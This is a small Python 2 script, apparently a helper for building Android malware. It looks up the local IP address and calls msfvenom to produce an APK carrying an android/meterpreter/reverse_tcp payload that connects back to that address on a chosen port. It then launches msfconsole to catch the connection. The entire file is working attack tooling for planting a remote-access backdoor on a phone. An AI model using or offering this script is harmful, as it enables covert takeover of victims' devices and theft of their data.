import socket
import os
import argparse
from subprocess import Popen, PIPE, STDOUT

class createAPK:
    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def launchProcess(self,command):
        p = Popen(command, stdout = PIPE, 
            stderr = STDOUT, shell = True)
        for line in p.stdout:
            print line.replace('\n', '')
        return 0
    
    def create(self, app_name, lp):
        
        ipl = self.get_ip_address()
        print ipl
        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
        
        self.launchProcess(com)
        
##PARSER SHIT
parser = argparse.ArgumentParser(description='Testing')
        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                            #help='ip remota')
parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                    help='nombre de la app')
parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                    help='local port')
args = parser.parse_args()
##//PARSER SHIT---------

APK = createAPK()
APK.create(args.app_name, args.lp)
APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")

raw_input("Press Enter to continue...")